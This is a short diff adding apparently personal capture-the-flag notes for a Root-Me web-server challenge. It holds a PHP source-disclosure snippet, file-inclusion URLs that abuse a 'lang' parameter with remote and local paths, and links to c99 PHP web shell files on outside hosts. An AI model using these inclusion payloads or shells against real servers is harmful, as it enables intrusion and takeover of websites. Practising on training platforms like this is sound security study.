@@ -1,0 +1,13 @@
+<?php
+show_source("index.php");
+?>
+
+
+http://challenge01.root-me.org/web-serveur/ch13/?lang=http://google.com?
+
+http://challenge01.root-me.org/web-serveur/ch13/?lang=C:\...\...\rootme\new1
+
+						      http://www.sh3ll.org/c99.txt?
+
+
+                                                      http://www.c99shellphp.com/shell/c99.txt
